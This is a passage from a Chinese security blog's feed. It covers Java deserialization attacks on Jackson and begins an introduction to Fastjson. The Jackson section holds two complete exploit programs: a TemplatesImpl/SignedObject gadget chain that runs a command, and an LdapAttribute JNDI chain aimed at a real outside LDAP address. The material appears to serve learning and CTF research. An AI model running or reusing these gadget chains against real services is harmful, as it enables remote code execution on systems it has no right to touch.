class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tongsha;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SignObjectChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val2.set(exp2,jsonNodes2);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(exp2,privateKey,signingEngine);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line">        <span class="comment">//byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line">        <span class="comment">//fileInputStream.read(byt);</span></span><br><span class="line">        <span class="comment">//doPOST(byt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LdapAttribute链">LdapAttribute链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ValueNode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.JMX;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.naming.CompositeName;</span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.BaseRowSet;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapAttributeChain</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapCtxUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://114.116.119.253:9999/&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ldapAttributeClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ldapAttributeClazzConstructor</span> <span class="operator">=</span> ldapAttributeClazz.getDeclaredConstructor(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;);</span><br><span class="line">        ldapAttributeClazzConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldapAttribute</span> <span class="operator">=</span> ldapAttributeClazzConstructor.newInstance(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;name&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">baseCtxUrlField</span> <span class="operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="string">&quot;baseCtxURL&quot;</span>);</span><br><span class="line">        baseCtxUrlField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">rdnField</span> <span class="operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="string">&quot;rdn&quot;</span>);</span><br><span class="line">        rdnField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        rdnField.set(ldapAttribute, <span class="keyword">new</span> <span class="title class_">CompositeName</span>(<span class="string">&quot;a//b&quot;</span>));</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(ldapAttribute);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这条链的分析参考：</p><p><a href="https://stack.chaitin.com/techblog/detail/15">https://stack.chaitin.com/techblog/detail/15</a></p><p><a href="https://y4er.com/posts/real-wolrd-ctf-old-system-new-getter-jndi-gadget/">https://y4er.com/posts/real-wolrd-ctf-old-system-new-getter-jndi-gadget/</a></p><p>参考：<br><a href="http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/#0x03-%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8">http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/#0x03-%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/#TemplatesImpl%E9%93%BE</a></p><p><a href="https://xz.aliyun.com/t/12966">https://xz.aliyun.com/t/12966</a></p><p><a href="https://xz.aliyun.com/t/12509?">https://xz.aliyun.com/t/12509?</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;这里直接引用别的师傅的&lt;/p&gt;
&lt;p&gt;Jackson是一个流行的Java库，用于处理JSON格式的数据。它提供了一组功能强大的工具，可以方便地在Java对象和JSON之间进行转换。以下是关于Jackson库的介绍：&lt;/p&gt;
&lt;p&gt;Ja</summary>
      
    
    
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Jackson" scheme="https://oceanzbz.github.io/tags/Jackson/"/>
    
  </entry>
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="https://oceanzbz.github.io/post/7d64f54c.html"/>
    <id>https://oceanzbz.github.io/post/7d64f54c.html</id>
    <published>2024-12-30T06:11:39.000Z</published>
    <updated>2025-03-05T07:24:36.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Fastjson回顾">Fastjson回顾</h2><p>这里先来回顾一下fastjson怎么使用，其实研究具体的漏洞主要就是fastjson的序列化和反序列化</p><p>先来创建一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getage&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set age&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get id&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set id&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来开始实验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//将一个java对象序列化为json字符串</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;ocean&quot;</span>, <span class="number">22</span>, <span class="number">123456</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(ocean);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        <span class="comment">//将一个json字符传反序列化为 java对象</span></span><br><span class="line">        <span class="comment">//json字符串还原位对象的两种方法：</span></span><br><span class="line">        <span class="comment">//这里使用parse会将jsonstring反序列化成json对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">        System.out.println(parse.getClass().getName());</span><br><span class="line">        <span class="comment">//这里使用paseObject会将jsonstring反序列化成json对象</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(jsonObject.getClass().getName());</span><br><span class="line">        <span class="comment">//使用parseObject将json字符串反学列化成指定的java对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsonString, User.class);</span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果我们反序列化时不指定特定的类，那么Fastjosn就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中<code>private</code>类型的属性值，Fastjson默认不会将其序列化和反序列化。</p><h3 id="Fastjson中的-type">Fastjson中的@type</h3><p>当我们在使用Fastjson序列化对象的时候，如果<code>toJSONString()</code>方法不添加额外的属性，那么就会将一个Java Bean转换成JSON字符串。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733466117349-36488218-a102-4b40-93ed-5c71dbae14d5.png" alt=""></p><p>如果我们想把JSON字符串反序列化成Java 